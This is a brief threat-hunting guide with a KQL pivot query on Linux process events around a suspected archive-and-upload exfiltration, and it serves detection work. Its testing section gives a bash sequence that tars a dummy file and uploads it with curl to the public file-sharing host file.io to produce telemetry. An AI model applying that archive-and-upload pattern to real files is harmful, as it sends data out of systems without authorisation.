### Pivot B – User activity leading up to exfiltration

## Follow‑up pivots (recommended)

Use this when pivoting from the **Linux – Archive Command Followed by Upload Egress** query. They are strongly recommended to understand scope and intent.

Use this pivot to identify:

* Pre‑exfiltration reconnaissance
* Credential access
* Script execution
* Operator behaviour

```kql
// Update DeviceName and time window as required
DeviceProcessEvents
| where DeviceName =~ "DeviceNameHere"
| where Timestamp between (datetime(2026-01-30T14:50:00Z) .. datetime(2026-01-30T15:10:00Z))
| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

---

## Testing and validation guidance

To safely generate telemetry for this hunt:

```bash
cd /tmp
echo test > a.txt
tar -czf test-exfil.tgz a.txt
curl -F file=@test-exfil.tgz https://file.io/?expires=1d
```

This sequence reliably produces:

* Archive creation intent
* Outbound upload activity
* Correlated results in the hunt